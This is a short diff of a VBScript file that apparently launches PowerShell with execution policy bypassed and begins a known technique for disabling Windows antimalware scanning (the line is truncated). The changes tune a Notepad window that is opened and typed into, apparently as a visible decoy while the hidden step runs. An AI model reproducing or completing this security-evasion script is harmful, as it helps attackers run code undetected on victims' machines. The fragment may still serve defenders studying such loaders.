@@ -3,8 +3,8 @@ oshell.run "powershell.exe -nop -exec bypass; [Ref].Assembly.GetType('System.Man
 
 
 Set Notepad = WScript.CreateObject("WScript.Shell")
-Notepad.Run "c:\windows\system32\notepad.exe", 3, True
+Notepad.Run "c:\windows\system32\notepad.exe", 1, False
 
-WScript.Sleep 1500
+WScript.Sleep 1000
 
 Notepad.SendKeys "Password: secure this"
